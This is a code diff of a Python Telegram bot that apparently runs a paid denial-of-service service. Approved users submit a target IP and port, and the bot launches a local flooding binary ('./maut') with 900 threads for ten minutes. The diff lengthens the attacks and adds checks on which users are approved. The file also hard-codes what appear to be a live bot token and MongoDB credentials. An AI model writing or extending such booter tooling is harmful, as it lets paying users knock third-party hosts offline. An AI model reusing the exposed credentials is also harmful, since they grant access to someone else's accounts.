@@ -5,13 +5,13 @@ from pymongo import MongoClient
 from datetime import datetime, timedelta
 import certifi
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
 MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
 CHANNEL_ID = -1002512368825
 ADMIN_IDS = [8167507955]
-
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
 db = client['soul']
@@ -20,17 +20,23 @@ bot = telebot.TeleBot(TOKEN)
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 user_attack_details = {}
 active_attacks = {}
+
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
-        if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if action == 1:  # Start attack
+            # Using fixed 600 seconds (10 minutes) and 900 threads as per your requirement
+            process = subprocess.Popen(["./maut", target_ip, str(target_port), "600", "900"], 
+                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
-        elif action == 2:
+            logging.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
+        elif action == 2:  # Stop attack
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
             if pid:
                 subprocess.run(["kill", str(pid)], check=True)
+                logging.info(f"Stopped attack with PID {pid}")
     except Exception as e:
         logging.error(f"Error in run_attack_command_sync: {e}")
+
 def is_user_admin(user_id, chat_id):
     try:
         chat_member = bot.get_chat_member(chat_id, user_id)
@@ -50,16 +56,13 @@ def check_user_approval(user_id):
         logging.error(f"Error in checking user approval: {e}")
         return False
 
-
 def send_not_approved_message(chat_id):
     bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
-
 
 def send_main_buttons(chat_id):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
     markup.add(KeyboardButton("ATTACK"), KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
     bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')
-    
 
 @bot.message_handler(commands=['approve'])
 def approve_user(message):
@@ -85,9 +88,8 @@ def approve_user(message):
         )
         bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
     except Exception as e:
-        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Error processing approval*", parse_mode='Markdown')
         logging.error(f"Error in approving user: {e}")
-
 
 @bot.message_handler(commands=['disapprove'])
 def disapprove_user(message):
@@ -109,8 +111,9 @@ def disapprove_user(message):
         )
         bot.send_message(message.chat.id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
     except Exception as e:
-        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Error processing disapproval*", parse_mode='Markdown')
         logging.error(f"Error in disapproving user: {e}")
+
 @bot.message_handler(func=lambda message: message.text == "ATTACK")
 def attack_button_handler(message):
     if not check_user_approval(message.from_user.id):
@@ -119,8 +122,8 @@ def attack_button_handler(message):
 
     bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack_ip_port)
-    
-@bot.message_handler(commands=['Attack'])
+
+@bot.message_handler(commands=['attack'])
 def attack_command(message):
     if not check_user_approval(message.from_user.id):
         send_not_approved_message(message.chat.id)
@@ -149,13 +152,18 @@ def process_attack_ip_port(message):
 
 @bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
 def start_attack(message):
+    if not check_user_approval(message.from_user.id):
+        send_not_approved_message(message.chat.id)
+        return
+
     attack_details = user_attack_details.get(message.from_user.id)
     if attack_details:
         target_ip, target_port = attack_details
         run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
         bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Attack will run for 10 minutes with 900 threads*", parse_mode='Markdown')
     else:
-        bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*No target specified. Use /attack to set it up.*", parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: message.text == "Stop Attack")
 def stop_attack(message):
